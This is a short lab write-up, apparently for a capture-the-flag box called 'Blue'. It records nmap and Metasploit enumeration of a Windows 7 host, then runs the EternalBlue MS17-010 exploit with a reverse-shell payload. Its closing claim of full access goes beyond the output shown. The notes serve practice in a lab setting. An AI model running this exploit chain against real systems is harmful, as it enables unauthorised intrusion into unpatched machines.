@@ -1,0 +1,49 @@
+Blue Lab:
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.214.226
+
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.129.214.226
+RHOSTS => 10.129.214.226
+msf6 auxiliary(scanner/smb/smb_version) > set RPORT 445
+RPORT => 445
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 10.129.214.226:445    - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:16m 51s) (guid:{8bc1d7c4-f9c3-474f-9834-94763c86e9b4}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
+[+] 10.129.214.226:445    -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:16m 51s) (guid:{8bc1d7c4-f9c3-474f-9834-94763c86e9b4}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
+[*] 10.129.214.226:       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms17_010_eternalblue 
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+The target is running Windows 7 Professional SP1, which is a prime candidate for EternalBlue (MS17-010).
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[-] Handler failed to bind to 10.0.14.206:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] 10.129.214.226:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.129.214.226:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.129.214.226:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 10.129.214.226:445 - The target is vulnerable.
+[*] 10.129.214.226:445 - Connecting to target for exploitation.
+[+] 10.129.214.226:445 - Connection established for exploitation.
+
+Now we have root and user access.
